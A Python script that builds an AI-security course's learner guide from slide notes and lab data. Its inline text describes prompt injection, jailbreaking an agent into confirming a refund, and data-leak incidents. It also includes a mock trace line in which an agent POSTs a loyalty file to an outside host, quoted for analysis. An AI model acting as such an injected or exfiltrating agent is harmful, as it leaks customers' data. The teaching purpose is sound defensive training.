#!/usr/bin/env python3
"""Learner Guide (DOCX + Markdown mirror). Narrative comes from the deck's slide notes, labs from data_labs, so all stay aligned.
Knowledge → Lab order follows the deck: 'Key Concepts for Lab N' sits directly before Lab N."""
import json, os, re, sys
from docx import Document
from docx.shared import Pt, RGBColor
from pptx import Presentation
HERE = os.path.dirname(os.path.abspath(__file__)); sys.path.insert(0, HERE)
import course_data as C
from data_labs import LABS, LAB_BY_NUM
import prodoc
from version_history import PRIOR
def _repo():
    d = HERE
    for _ in range(8):
        d = os.path.dirname(d)
        if os.path.isdir(os.path.join(d, "courseware")) and os.path.isdir(os.path.join(d, "labs")): return d
REPO = _repo(); ASSETS = os.path.join(os.path.dirname(HERE), "assets")
MAP = json.load(open(os.path.join(HERE, "slide_map.json")))
prs = Presentation(os.path.join(REPO, "courseware", C.DECK_NAME + ".pptx")); SL = list(prs.slides)
def info(n):
    """(title, notes, source) for slide n, 1-based."""
    s = SL[n - 1]; tx = [sh for sh in s.shapes if sh.has_text_frame and sh.text_frame.text.strip()]
    big = sorted((sh for sh in tx if sh.top is not None and sh.top < 1300000 and sh.text_frame.paragraphs[0].runs and sh.text_frame.paragraphs[0].runs[0].font.size and sh.text_frame.paragraphs[0].runs[0].font.size.pt >= 20), key=lambda sh: sh.top)
    title = big[0].text_frame.text.strip().replace("\n", " ") if big else ""
    if not title:
        lg = sorted(tx, key=lambda sh: -(sh.text_frame.paragraphs[0].runs[0].font.size.pt if sh.text_frame.paragraphs[0].runs and sh.text_frame.paragraphs[0].runs[0].font.size else 0)); title = lg[0].text_frame.text.strip().replace("\n", " ") if lg else ""
    n_ = s.notes_slide.notes_text_frame.text if s.has_notes_slide else ""
    src = ""
    if "\n\nSource:" in n_: n_, src = n_.split("\n\nSource:", 1); src = src.strip()
    return title, n_.strip(), src
def block(a, b):
    out = []
    for i in range(MAP[a], MAP[b]):
        t, n_, s_ = info(i)
        if n_ and not n_.startswith("Facilitator"): out.append((i, t, n_, s_))
    return out

doc = Document(); st = doc.styles["Normal"]; st.font.name = "Arial"; st.font.size = Pt(11); st.paragraph_format.space_after = Pt(6)
prodoc.style_headings(doc)
prodoc.add_cover_page(doc, "Learner Guide", C.TITLE, C.VERSION, org_logo=os.path.join(ASSETS, "tertiary-infotech-logo.png"), course_code=C.COURSE_CODE)
prodoc.add_version_control(doc, PRIOR + [C.VERSION_ROW]); prodoc.add_toc(doc)
md = [f"# Learner Guide: {C.TITLE}", "", f"Course code {C.COURSE_CODE} · Version {C.VERSION} · {C.VERSION_DATE} · {C.ORG} ({C.UEN})", ""]
def H(t, l=1): doc.add_heading(t, level=l); md.extend(["", "#" * (l + 1) + " " + t, ""])
def P(t, italic=False, size=None):
    p = doc.add_paragraph(); r = p.add_run(t); r.italic = italic
    if size: r.font.size = Pt(size)
    md.extend([("*" + t + "*") if italic else t, ""])
def B(items):
    for t in items: doc.add_paragraph(style="List Bullet").add_run(t); md.append("- " + t)
    md.append("")
def T(head, rows, w):
    t = doc.add_table(rows=0, cols=len(head)); t.style = "Table Grid"; h = t.add_row().cells
    for i, x in enumerate(head):
        h[i].text = ""; r = h[i].paragraphs[0].add_run(x); r.bold = True; r.font.size = Pt(9.5); r.font.color.rgb = RGBColor(255, 255, 255); prodoc._shade_cell(h[i], "21201C")
    for row in rows:
        c = t.add_row().cells
        for i, x in enumerate(row): c[i].text = ""; r = c[i].paragraphs[0].add_run(str(x)); r.font.size = Pt(9.5)
    prodoc.set_widths(t, w); doc.add_paragraph()
    md.extend(["| " + " | ".join(head) + " |", "|" + "---|" * len(head)] + ["| " + " | ".join(str(x).replace("\n", " ") for x in r) + " |" for r in rows] + [""])
def CODE(t):
    p = doc.add_paragraph(); r = p.add_run(t); r.font.name = "Courier New"; r.font.size = Pt(9); p.paragraph_format.left_indent = Pt(14)
    md.extend(["```text", t, "```", ""])

H("How to Use This Guide")
P(f"You can revise from this guide on its own. It explains each idea from the slides, gives you the worked labs step by step, and has practice questions with answers at the end. You run six labs today on {C.SCENARIO}. The lab screenshots you take become your answers in the Case Study, so save them as you go.")
H("Your Day in Three Moves", 2)
P("Topic 1 shows what always-on agents are and why people use them. Topic 2 breaks one three ways: prompt injection, jailbreak and data leak. Topic 3 gives you the five principles of AI security, then you write an AI Governance Policy and an AI Incident Report.")
H("Learning Outcomes", 2); B([f"{a}: {b}" for a, b in C.LEARNING_OUTCOMES])
H("Learning Units, Knowledge and Abilities", 2)
T(["LU", "LO", "Course Proposal topics", "K and A", "Delivered through"], [[f"{u['lu']}: {u['title']}", u["lo"], "\n".join(u["cp_topics"]), ", ".join(u["codes"]), u["delivered"]] for u in C.LUS], [1.1, 0.45, 3.1, 0.75, 1.4])
T(["Code", "Statement"], [[a, b] for a, b in C.KNOWLEDGE + C.ABILITIES], [0.7, 6.1])
H("Assessment at a Glance", 2)
B(["Written Assessment (SAQ): 30 minutes, 5 short-answer questions, K1 to K5.", "Case Study: 30 minutes, Q1 to Q3, A1 to A5. Paste your lab screenshots as your answers, then write the short analysis each question asks for.", "Open book: slides, this guide and your own lab evidence. Results are Competent or Not Yet Competent.", "Case Study evidence: Lab 1 for Q1; Labs 2, 3 and 4 for Q2; Labs 5 and 6 for Q3."])
H("Before You Start", 2)
B(["Bring a Mac (Apple Silicon) or a Windows laptop. Install Hermes Desktop before class if you can: hermes-agent.nousresearch.com/desktop.", "Download the course ZIP from " + C.REPO_URL + " and unzip it. Each folder under labs/ holds LAB-0N-Instructions.pdf, data/ and scripts/.", "Copy prompts with one click from " + C.PROMPTS_URL + ", or open prompts/index.html from the downloaded folder.", "Everything in the labs is fictional. Attack only your own lab agent, never a real system."])

import glob, subprocess, tempfile
from docx.shared import Inches
_tmp = tempfile.mkdtemp(); _pdf = os.path.join(REPO, "courseware", C.DECK_NAME + ".pdf")
subprocess.run(["pdftoppm", "-r", "80", "-jpeg", "-jpegopt", "quality=72", _pdf, os.path.join(_tmp, "s")], check=True)
_imgs = sorted(glob.glob(os.path.join(_tmp, "s-*.jpg")))
def concepts(title, a, b):
    H(title, 2)
    for i, t, n_, s_ in block(a, b):
        H(t or f"Slide {i}", 3)
        doc.add_paragraph().add_run().add_picture(_imgs[i - 1], width=Inches(5.6))
        P(f"Slide {i}", italic=True, size=8.5); P(n_)
        if s_: P("Source: " + s_, italic=True, size=9.5)
def lab(n):
    L = LAB_BY_NUM[n]
    H(f"{L['label']}: {L['title']}", 2)
    P(f"{L['minutes']} minutes · {L['lo']} · {L['codes']} · {L['paradigm']}. Folder: labs/{L['slug']}/", italic=True); P(L["hook"])
    H("Goal", 3); P(L["check"]); P(L["scenario"])
    fi = MAP["lab%d" % n] + 1
    doc.add_paragraph().add_run().add_picture(_imgs[fi - 1], width=Inches(5.6)); P(f"How Lab {n} runs (slide {fi})", italic=True, size=8.5)
    H(f"Key Concepts for {L['label']}", 3); B(L["concepts"])
    H("You Will Hand In", 3); B(L["deliverables"])
    H("Before You Start", 3); B(L["prereq"])
    if L.get("tested"): P(L["tested"] + " Your numbers may differ: record what you see.", italic=True)
    H("Steps", 3)
    for i, st_ in enumerate(L["steps"], 1):
        P(f"Step {i}. {st_['title']}")
        if st_.get("body"): P(st_["body"])
        if st_.get("prompt"): P("Paste into " + st_.get("where", "Hermes Desktop") + ":", size=10); CODE(st_["prompt"])
        if st_.get("expect"): P("You should see: " + st_["expect"], size=10.5)
        if st_.get("shot"): P(f"Screenshot for {L['shot']}. Paste it into your Case Study paper as your answer.", size=10.5)
    H("Self-Check", 3); B(L["verify"]); P("Expected outcome: " + L["check"])
    H("If Something Goes Wrong", 3); T(["What you see", "What to do"], L["trouble"], [2.6, 4.2])
    H("Finished Early?", 3); P(L["challenge"])

H("Topic 1: " + C.TOPICS[0]["title"]); P("Learning Unit LU1 Generative AI Fundamentals · LO1 · K2, K3, A4", italic=True)
concepts("How We Got Here, and How It Works", "t1", "t1cases"); concepts("Where You See It Today", "t1cases", "lab1"); lab(1)
H("Topic 2: " + C.TOPICS[1]["title"]); P("Learning Unit LU2 Prompt Engineering · LO2 · K1, K4, A3, A5", italic=True)
concepts("Prompt Engineering, Data Quality and Prompt Injection", "t2", "lab2"); lab(2); concepts("Jailbreak", "t2jb", "lab3"); lab(3); concepts("Data Leak and the PDPA", "t2leak", "lab4"); lab(4)
H("Topic 3: " + C.TOPICS[2]["title"]); P("Learning Unit LU3 Ethical Considerations · LO3 · K5, A1, A2", italic=True)
concepts("How a Model Works; Limits, Bias and Ethics", "t3", "t3five"); concepts("The Five Principles of AI Security", "t3five", "t3tea"); concepts("The Frameworks Behind the Principles", "t3tea", "lab5"); lab(5); concepts("When It Happens Anyway", "t3inc", "lab6"); lab(6)

H("Worked Example: Reading One Trace")
P("This line comes from the Lab 6 mock traces:"); CODE('{"ts":"2026-08-07T02:17","session":"s-0807-0210","agent":"Mia","tool":"http_post","target":"https://audit-share.example/upload","bytes":148220,"status":"200"}')
B(["When: 02:17 on 7 August 2026.", "Which agent: Mia, in session s-0807-0210. Search that session for how it started.", "What it did: an HTTP POST, which sends data out.", "Where: audit-share.example, not an address Kopi Kaki owns.", "How much: 148,220 bytes, the same size as the loyalty file read two minutes earlier.", "Result: status 200 means the upload succeeded. Contain now."])
H("Practice Questions, With Answers")
P("These are for your own revision. They are not the assessment questions.")
PQ = [("A customer review tells your agent to add a link to its report. What is this called, and why can the model not simply ignore it?", "Indirect prompt injection. In the context window, everything is tokens, so the model has no reliable boundary between your instruction and the text it reads."),
      ("Name the three parts of the lethal trifecta.", "Access to private data, exposure to untrusted content, and the ability to communicate externally."),
      ("Your Lab 3 attack made the free model confirm a refund. Name one control that does not depend on the model at all.", "A gate in code, such as voucher_gate.py, which checks an allowlist and ignores the conversation."),
      ("A breach involves 800 members. Is it notifiable to PDPC, and when does the 3-day clock start?", "Yes, because 500 or more individuals are involved. The 3 calendar days start when you determine the breach is notifiable, not when it happened."),
      ("What does 'right-sized' mean, given that the free model failed in the labs?", "The smallest model that passes your own checks for that job's risk. It does not mean the cheapest or the most powerful."),
      ("What is the difference between 'exposed' and 'leaked'?", "Exposed means data was accessible through a flaw. Leaked implies that it actually left. In McHire, 64 million records were exposed, and Paradox.ai says researchers accessed seven records."),
      ("Is an AI-written policy a policy?", "Not until a named person has reviewed, corrected and owned it.")]
for i, (q, a) in enumerate(PQ, 1): P(f"Q{i}. {q}"); P("Answer: " + a, italic=True)
H("Glossary")
T(["Term", "Meaning"], [["Agentic AI", "AI that pursues a goal in a loop: context, plan, execute, verify."], ["AI agent", "A deployed system using that loop: a model plus tools, memory, instructions and controls."], ["Always-on agent", "An agent that can keep working between your messages."], ["Context window", "Everything the model can see at once, as tokens."], ["Data leak", "Sensitive information reaching someone who should not have it. OWASP LLM02."], ["Discriminative model", "A model that sorts or scores existing input."], ["Generative model", "A model that produces new content."], ["Guardrail", "A control that limits what an agent reads or does. Strongest when it runs outside the model."], ["Harness", "The system around a model: loop, tools, memory, controls."], ["Inference", "Using a trained model to produce output."], ["Jailbreak", "Talking a model out of its rules."], ["PDPA", "Personal Data Protection Act 2012, Singapore. Regulated by PDPC."], ["Prompt injection", "Input that alters a model's behaviour in unintended ways. OWASP LLM01."], ["Token", "The small chunk of text a model reads and predicts."], ["Trace", "A timestamped record of what an agent did."]], [1.8, 5.0])
H("Learning Resources and References")
P("Checked 7 November 2026. Vendors change products, prices and availability without notice.", italic=True)
seen = []
for i in range(1, len(SL) + 1):
    _, _, s_ = info(i)
    if s_ and s_ not in seen: seen.append(s_)
B(seen + ["Hermes Agent documentation: https://hermes-agent.nousresearch.com/docs/", "OWASP GenAI Security Project: https://genai.owasp.org/", "PDPC: https://www.pdpc.gov.sg/", "IMDA Model AI Governance Framework for Agentic AI: https://www.imda.gov.sg/"])
prodoc.add_page_numbers(doc); prodoc.enable_update_fields(doc)
doc.core_properties.title = C.TITLE + " Learner Guide"; doc.core_properties.author = C.ORG
OUT = os.path.join(REPO, "courseware", C.LG_NAME + ".docx"); doc.save(OUT)
open(os.path.join(REPO, "courseware", "LEARNER-GUIDE.md"), "w", encoding="utf-8").write("\n".join(md)); print("saved", OUT, "words", len(" ".join(md).split()))
